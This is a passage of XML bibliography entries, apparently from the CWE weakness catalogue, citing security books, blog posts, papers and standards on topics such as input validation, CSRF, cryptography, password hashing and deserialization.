			<Publication>McGraw-Hill</Publication>
			<Publication_Year>2010</Publication_Year>
		</External_Reference>
      <External_Reference Reference_ID="REF-45">
			<Author>OWASP</Author>
			<Title>OWASP Enterprise Security API (ESAPI) Project</Title>
			<URL>http://www.owasp.org/index.php/ESAPI</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-46">
			<Author>Joshbw</Author>
			<Title>Output Sanitization</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---18</Publication_Day>
			<URL>http://www.analyticalengine.net/archives/58</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-47">
			<Author>Niyaz PK</Author>
			<Title>Sanitizing user data: How and where to do it</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---11</Publication_Day>
			<URL>http://www.diovo.com/2008/09/sanitizing-user-data-how-and-where-to-do-it/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-48">
			<Author>Jeremiah Grossman</Author>
			<Title>Input validation or output filtering, which is better?</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---30</Publication_Day>
			<URL>http://jeremiahgrossman.blogspot.com/2007/01/input-validation-or-output-filtering.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-49">
			<Author>Jim Manico</Author>
			<Title>Input Validation - Not That Important</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---10</Publication_Day>
			<URL>http://manicode.blogspot.com/2008/08/input-validation-not-that-important.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-50">
			<Author>Michael Eddington</Author>
			<Title>Preventing XSS with Correct Output Encoding</Title>
			<URL>http://phed.org/2008/05/19/preventing-xss-with-correct-output-encoding/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-52">
			<Author>Greg Hoglund</Author>
			<Author>Gary McGraw</Author>
			<Title>Exploiting Software: How to Break Code</Title>
			<Publication_Year>2004</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---27</Publication_Day>
			<Publisher>Addison-Wesley</Publisher>
			<URL>http://www.exploitingsoftware.com/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-53">
			<Author>Alec Muffet</Author>
			<Title>The night the log was forged</Title>
			<URL>http://doc.novsu.ac.ru/oreilly/tcpip/puis/ch10_05.htm</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-62">
			<Author>Mark Dowd</Author>
			<Author>John McDonald</Author>
			<Author>Justin Schuh</Author>
			<Title>The Art of Software Security Assessment</Title>
			<Edition>1st Edition</Edition>
			<Publication_Year>2006</Publication_Year>
			<Publisher>Addison Wesley</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-76">
			<Author>Sean Barnum</Author>
			<Author>Michael Gegick</Author>
			<Title>Least Privilege</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<URL>https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/least-privilege</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-103">
			<Author>Microsoft Corporation</Author>
			<Title>How To: Encrypt Configuration Sections in ASP.NET 2.0 Using DPAPI</Title>
			<URL>http://msdn.microsoft.com/en-us/library/ms998280.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-104">
			<Author>Microsoft Corporation</Author>
			<Title>How To: Encrypt Configuration Sections in ASP.NET 2.0 Using RSA</Title>
			<URL>http://msdn.microsoft.com/en-us/library/ms998283.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-105">
			<Author>Microsoft Corporation</Author>
			<Title>.NET Framework Developer's Guide - Securing Connection Strings</Title>
			<URL>http://msdn.microsoft.com/en-us/library/89211k9b(VS.80).aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-140">
			<Author>Greg Hoglund</Author>
			<Author>Gary McGraw</Author>
			<Title>Exploiting Software: How to Break Code</Title>
			<Publication_Year>2004</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---27</Publication_Day>
			<Publisher>Addison-Wesley</Publisher>
			<URL>https://www.amazon.com/Exploiting-Software-How-Break-Code/dp/0201786958</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-141">
			<Author>Steve Christey</Author>
			<Title>Blacklist defenses as a breeding ground for vulnerability variants</Title>
			<Publication_Year>2006</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---03</Publication_Day>
			<URL>http://seclists.org/fulldisclosure/2006/Feb/0040.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-166">
			<Author>Jim Manico</Author>
			<Title>Input Validation with ESAPI - Very Important</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<URL>http://manicode.blogspot.com/2008/08/input-validation-with-esapi.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-168">
			<Author>Joel Scambray</Author>
			<Author>Mike Shema</Author>
			<Author>Caleb Sima</Author>
			<Title>Hacking Exposed Web Applications, Second Edition</Title>
			<Publication_Year>2006</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<Publisher>McGraw-Hill</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-170">
			<Author>Kevin Beaver</Author>
			<Title>The importance of input validation</Title>
			<Publication_Year>2006</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---06</Publication_Day>
			<URL>http://searchsoftwarequality.techtarget.com/tip/0,289483,sid92_gci1214373,00.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-172">
			<Author>Chris Wysopal</Author>
			<Title>Mobile App Top 10 List</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---13</Publication_Day>
			<URL>http://www.veracode.com/blog/2010/12/mobile-app-top-10-list/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-174">
			<Author>Web Application Security Consortium</Author>
			<Title>Information Leakage</Title>
			<URL>http://www.webappsec.org/projects/threat/classes/information_leakage.shtml</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-175">
			<Author>Brian Chess</Author>
			<Author>Jacob West</Author>
			<Title>Secure Programming with Static Analysis</Title>
			<Publication_Year>2007</Publication_Year>
			<Publisher>Addison-Wesley</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-176">
			<Author>Michael Howard</Author>
			<Author>David LeBlanc</Author>
			<Title>Writing Secure Code</Title>
			<Edition>1st Edition</Edition>
			<Publication_Year>2001</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---13</Publication_Day>
			<Publisher>Microsoft Press</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-179">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 16 - Information Exposure Through an Error Message</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---17</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://software-security.sans.org/blog/2010/03/17/top-25-series-rank-16-information-exposure-through-an-error-message</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-185">
			<Author>OWASP</Author>
			<Title>Testing for Path Traversal (OWASP-AZ-001)</Title>
			<URL>http://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-186">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 7 - Path Traversal</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---09</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://blogs.sans.org/appsecstreetfighter/2010/03/09/top-25-series-rank-7-path-traversal/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-192">
			<Author>OWASP</Author>
			<Title>OWASP Attack listing</Title>
			<URL>http://www.owasp.org/index.php/Relative_Path_Traversal</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-196">
			<Author>Jerome H. Saltzer</Author>
			<Author>Michael D. Schroeder</Author>
			<Title>The Protection of Information in Computer Systems</Title>
			<Publication>Proceedings of the IEEE 63</Publication>
			<Publication_Year>1975</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<URL>http://web.mit.edu/Saltzer/www/publications/protection/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-207">
			<Author>John Viega</Author>
			<Author>Gary McGraw</Author>
			<Title>Building Secure Software: How to Avoid Security Problems the Right Way</Title>
			<Edition>1st Edition</Edition>
			<Publication_Year>2002</Publication_Year>
			<Publisher>Addison-Wesley</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-229">
			<Author>NIST</Author>
			<Title>Role Based Access Control and Role Based Security</Title>
			<URL>http://csrc.nist.gov/groups/SNS/rbac/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-231">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 5 - Improper Access Control (Authorization)</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---04</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://blogs.sans.org/appsecstreetfighter/2010/03/04/top-25-series-rank-5-improper-access-control-authorization/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-233">
			<Author>Rahul Bhattacharjee</Author>
			<Title>Authentication using JAAS</Title>
			<URL>http://www.javaranch.com/journal/2008/04/authentication-using-JAAS.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-236">
			<Author>Kim Zetter</Author>
			<Title>Weak Password Brings 'Happiness' to Twitter Hacker</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---09</Publication_Day>
			<URL>http://www.wired.com/threatlevel/2009/01/professed-twitt/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-237">
			<Author>OWASP</Author>
			<Title>Top 10 2007-Broken Authentication and Session Management</Title>
			<Publication_Year>2007</Publication_Year>
			<URL>http://www.owasp.org/index.php/Top_10_2007-A7</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-238">
			<Author>OWASP</Author>
			<Title>Guide to Authentication</Title>
			<URL>http://www.owasp.org/index.php/Guide_to_Authentication</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-239">
			<Author>Microsoft</Author>
			<Title>Authentication</Title>
			<URL>http://msdn.microsoft.com/en-us/library/aa374735(VS.85).aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-243">
			<Author>Sascha Fahl, Marian Harbach, Thomas Muders, Matthew Smith</Author>
			<Author>Lars Baumgärtner, Bernd Freisleben</Author>
			<Title>Why Eve and Mallory Love Android: An Analysis of Android SSL (In)Security</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---16</Publication_Day>
			<URL>http://www2.dcsec.uni-hannover.de/files/android/p50-fahl.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-244">
			<Author>M. Bishop</Author>
			<Title>Computer Security: Art and Science</Title>
			<Publication_Year>2003</Publication_Year>
			<Publisher>Addison-Wesley</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-245">
			<Author>Martin Georgiev</Author>
			<Author>Subodh Iyengar</Author>
			<Author>Suman Jana</Author>
			<Author>Rishita Anubhai</Author>
			<Author>Dan Boneh</Author>
			<Author>Vitaly Shmatikov</Author>
			<Title>The Most Dangerous Code in the World: Validating SSL Certificates in Non-Browser Software</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<URL>http://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-249">
			<Author>Kenneth Ballard</Author>
			<Title>Secure programming with the OpenSSL API, Part 2: Secure handshake</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--05</Publication_Month>
			<Publication_Day>---03</Publication_Day>
			<URL>http://www.ibm.com/developerworks/library/l-openssl2/index.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-250">
			<Author>Eric Rescorla</Author>
			<Title>An Introduction to OpenSSL Programming (Part I)</Title>
			<Publication_Year>2001</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<URL>http://www.rtfm.com/openssl-examples/part1.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-257">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 19 - Missing Authentication for Critical Function</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---23</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://blogs.sans.org/appsecstreetfighter/2010/02/23/top-25-series-rank-19-missing-authentication-for-critical-function/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-265">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 10 - Missing Encryption of Sensitive Data</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://blogs.sans.org/appsecstreetfighter/2010/02/26/top-25-series-rank-10-missing-encryption-of-sensitive-data/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-267">
			<Author>Information Technology Laboratory, National Institute of Standards and Technology</Author>
			<Title>SECURITY REQUIREMENTS FOR CRYPTOGRAPHIC MODULES</Title>
			<Publication_Year>2001</Publication_Year>
			<Publication_Month>--05</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<URL>http://csrc.nist.gov/publications/fips/fips140-2/fips1402.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-271">
			<Author>OWASP</Author>
			<Title>Top 10 2007-Insecure Communications</Title>
			<Publication_Year>2007</Publication_Year>
			<URL>http://www.owasp.org/index.php/Top_10_2007-A9</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-280">
			<Author>Bruce Schneier</Author>
			<Title>Applied Cryptography</Title>
			<Publication_Year>1996</Publication_Year>
			<Publisher>John Wiley &amp; Sons</Publisher>
			<URL>http://www.schneier.com/book-applied.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-281">
			<Author>Alfred J. Menezes</Author>
			<Author>Paul C. van Oorschot</Author>
			<Author>Scott A. Vanstone</Author>
			<Title>Handbook of Applied Cryptography</Title>
			<Publication_Year>1996</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<URL>http://www.cacr.math.uwaterloo.ca/hac/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-282">
			<Author>C Matthew Curtin</Author>
			<Title>Avoiding bogus encryption products: Snake Oil FAQ</Title>
			<Publication_Year>1998</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<Publication_Day>---10</Publication_Day>
			<URL>http://www.faqs.org/faqs/cryptography-faq/snake-oil/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-284">
			<Author>Paul F. Roberts</Author>
			<Title>Microsoft Scraps Old Encryption in New Code</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<URL>http://www.eweek.com/c/a/Security/Microsoft-Scraps-Old-Encryption-in-New-Code/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-287">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 24 - Use of a Broken or Risky Cryptographic Algorithm</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://blogs.sans.org/appsecstreetfighter/2010/03/25/top-25-series-rank-24-use-of-a-broken-or-risky-cryptographic-algorithm/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-289">
			<Author>Alexander Sotirov et al.</Author>
			<Title>MD5 considered harmful today</Title>
			<URL>http://www.phreedom.org/research/rogue-ca/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-291">
			<Author>Johnny Shelley</Author>
			<Title>bcrypt</Title>
			<URL>http://bcrypt.sourceforge.net/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-292">
			<Author>Colin Percival</Author>
			<Title>Tarsnap - The scrypt key derivation function and encryption utility</Title>
			<URL>http://www.tarsnap.com/scrypt.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-293">
			<Author>B. Kaliski</Author>
			<Title>RFC2898 - PKCS #5: Password-Based Cryptography Specification Version 2.0</Title>
			<Publication_Year>2000</Publication_Year>
			<URL>http://tools.ietf.org/html/rfc2898</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-294">
			<Author>Coda Hale</Author>
			<Title>How To Safely Store A Password</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---31</Publication_Day>
			<URL>http://codahale.com/how-to-safely-store-a-password/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-295">
			<Author>Brian Krebs</Author>
			<Title>How Companies Can Beef Up Password Security (interview with Thomas H. Ptacek)</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---11</Publication_Day>
			<URL>http://krebsonsecurity.com/2012/06/how-companies-can-beef-up-password-security/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-296">
			<Author>Solar Designer</Author>
			<Title>Password security: past, present, future</Title>
			<Publication_Year>2012</Publication_Year>
			<URL>http://www.openwall.com/presentations/PHDays2012-Password-Security/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-297">
			<Author>Troy Hunt</Author>
			<Title>Our password hashing has no clothes</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<URL>http://www.troyhunt.com/2012/06/our-password-hashing-has-no-clothes.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-298">
			<Author>Joshbw</Author>
			<Title>Should we really use bcrypt/scrypt?</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---08</Publication_Day>
			<URL>http://www.analyticalengine.net/2012/06/should-we-really-use-bcryptscrypt/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-324">
			<Author>Taimur Aslam</Author>
			<Title>A Taxonomy of Security Faults in the UNIX Operating System</Title>
			<Publication_Year>1995</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---01</Publication_Day>
			<URL>http://cwe.mitre.org/documents/sources/ATaxonomyofSecurityFaultsintheUNIXOperatingSystem%5BAslam95%5D.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-329">
			<Author>Peter W</Author>
			<Title>Cross-Site Request Forgeries (Re: The Dangers of Allowing Users to Post Images)</Title>
			<Publication>Bugtraq</Publication>
			<URL>http://marc.info/?l=bugtraq&amp;m=99263135911884&amp;w=2</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-330">
			<Author>OWASP</Author>
			<Title>Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet</Title>
			<URL>http://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-331">
			<Author>Edward W. Felten</Author>
			<Author>William Zeller</Author>
			<Title>Cross-Site Request Forgeries: Exploitation and Prevention</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---18</Publication_Day>
			<URL>http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.147.1445</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-332">
			<Author>Robert Auger</Author>
			<Title>CSRF - The Cross-Site Request Forgery (CSRF/XSRF) FAQ</Title>
			<URL>http://www.cgisecurity.com/articles/csrf-faq.shtml</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-333">
			<Title>Cross-site request forgery</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---22</Publication_Day>
			<Publisher>Wikipedia</Publisher>
			<URL>http://en.wikipedia.org/wiki/Cross-site_request_forgery</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-334">
			<Author>Jason Lam</Author>
			<Title>Top 25 Series - Rank 4 - Cross Site Request Forgery</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---03</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://software-security.sans.org/blog/2010/03/03/top-25-series-rank-4-cross-site-request-forgery</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-335">
			<Author>Jeff Atwood</Author>
			<Title>Preventing CSRF and XSRF Attacks</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<URL>http://www.codinghorror.com/blog/2008/10/preventing-csrf-and-xsrf-attacks.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-338">
			<Author>J. Oates</Author>
			<Title>AOL man pleads guilty to selling 92m email addies</Title>
			<Publication>The Register</Publication>
			<Publication_Year>2005</Publication_Year>
			<URL>http://www.theregister.co.uk/2005/02/07/aol_email_theft/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-339">
			<Author>NIST</Author>
			<Title>Guide to Protecting the Confidentiality of Personally Identifiable Information (SP 800-122)</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<URL>http://csrc.nist.gov/publications/nistpubs/800-122/sp800-122.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-340">
			<Author>U.S. Department of Commerce</Author>
			<Title>Safe Harbor Privacy Framework</Title>
			<URL>http://www.export.gov/safeharbor/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-341">
			<Author>Federal Trade Commission</Author>
			<Title>Financial Privacy: The Gramm-Leach Bliley Act (GLBA)</Title>
			<URL>http://www.ftc.gov/privacy/glbact/index.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-342">
			<Author>U.S. Department of Human Services</Author>
			<Title>Health Insurance Portability and Accountability Act (HIPAA)</Title>
			<URL>http://www.hhs.gov/ocr/hipaa/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-343">
			<Author>Government of the State of California</Author>
			<Title>California SB-1386</Title>
			<Publication_Year>2002</Publication_Year>
			<URL>http://info.sen.ca.gov/pub/01-02/bill/sen/sb_1351-1400/sb_1386_bill_20020926_chaptered.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-422">
			<Author>Richard Stanway (r1CH)</Author>
			<Title>Dynamic File Uploads, Security and You</Title>
			<URL>http://shsc.info/FileUploadSecurity</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-423">
			<Author>Johannes Ullrich</Author>
			<Title>8 Basic Rules to Implement Secure File Uploads</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---28</Publication_Day>
			<URL>http://blogs.sans.org/appsecstreetfighter/2009/12/28/8-basic-rules-to-implement-secure-file-uploads/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-424">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 8 - Unrestricted Upload of Dangerous File Type</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://blogs.sans.org/appsecstreetfighter/2010/02/25/top-25-series-rank-8-unrestricted-upload-of-dangerous-file-type/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-432">
			<Author>Norm Hardy</Author>
			<Title>The Confused Deputy (or why capabilities might have been invented)</Title>
			<Publication_Year>1988</Publication_Year>
			<URL>http://www.cap-lore.com/CapTheory/ConfusedDeputy.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-433">
			<Author>Chaim Linhart</Author>
			<Author>Amit Klein</Author>
			<Author>Ronen Heled</Author>
			<Author>Steve Orrin</Author>
			<Title>HTTP Request Smuggling</Title>
			<URL>http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-434">
			<Author>David Wheeler</Author>
			<Title>Secure Programming for Linux and Unix HOWTO</Title>
			<Publication_Year>2003</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---03</Publication_Day>
			<URL>http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/semantic-attacks.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-454">
			<Author>Microsoft</Author>
			<Title>Introduction to Code Signing</Title>
			<URL>http://msdn.microsoft.com/en-us/library/ms537361(VS.85).aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-455">
			<Author>Microsoft</Author>
			<Title>Authenticode</Title>
			<URL>http://msdn.microsoft.com/en-us/library/ms537359(v=VS.85).aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-456">
			<Author>Apple</Author>
			<Title>Code Signing Guide</Title>
			<Publication>Apple Developer Connection</Publication>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---19</Publication_Day>
			<URL>http://developer.apple.com/documentation/Security/Conceptual/CodeSigningGuide/Introduction/chapter_1_section_1.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-457">
			<Author>Anthony Bellissimo</Author>
			<Author>John Burgess</Author>
			<Author>Kevin Fu</Author>
			<Title>Secure Software Updates: Disappointments and New Challenges</Title>
			<URL>http://prisms.cs.umass.edu/~kevinfu/papers/secureupdates-hotsec06.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-459">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 20 - Download of Code Without Integrity Check</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://blogs.sans.org/appsecstreetfighter/2010/04/05/top-25-series-rank-20-download-code-integrity-check/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-461">
			<Author>Matthias Kaiser</Author>
			<Title>Exploiting Deserialization Vulnerabilities in Java</Title>
			<Publication_Year>2015</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---28</Publication_Day>
			<URL>http://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-462">
			<Author>Sam Thomas</Author>
			<Title>PHP unserialization vulnerabilities: What are we missing?</Title>
			<Publication_Year>2015</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---27</Publication_Day>
			<URL>http://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-463">
			<Author>Gabriel Lawrence</Author>
			<Author>Chris Frohoff</Author>
			<Title>Marshalling Pickles: How deserializing objects can ruin your day</Title>
			<Publication_Year>2015</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---28</Publication_Day>
			<URL>http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-464">
			<Author>Heine Deelstra</Author>
			<Title>Unserializing user-supplied data, a bad idea</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<URL>http://heine.familiedeelstra.com/security/unserialize</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-465">
			<Author>Manish S. Saindane</Author>
			<Title>Black Hat EU 2010 - Attacking Java Serialized Communication</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<URL>http://www.slideshare.net/msaindane/black-hat-eu-2010-attacking-java-serialized-communication</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-466">
			<Author>Nadia Alramli</Author>
			<Title>Why Python Pickle is Insecure</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---09</Publication_Day>
			<URL>http://nadiana.com/python-pickle-insecure</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-467">
			<Author>Nelson Elhage</Author>
			<Title>Exploiting misuse of Python's "pickle"</Title>
			<Publication_Year>2011</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---20</Publication_Day>
			<URL>https://blog.nelhage.com/2011/03/exploiting-pickle/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-468">
			<Author>Chris Frohoff</Author>
			<Title>Deserialize My Shorts: Or How I Learned to Start Worrying and Hate Java Object Deserialization</Title>
			<Publication_Year>2016</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---21</Publication_Day>
			<URL>https://www.slideshare.net/frohoff1/deserialize-my-shorts-or-how-i-learned-to-start-worrying-and-hate-java-object-deserialization</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-483">
			<Author>Craig A. Shue</Author>
			<Author>Andrew J. Kalafut</Author>
			<Author>Minaxi Gupta</Author>
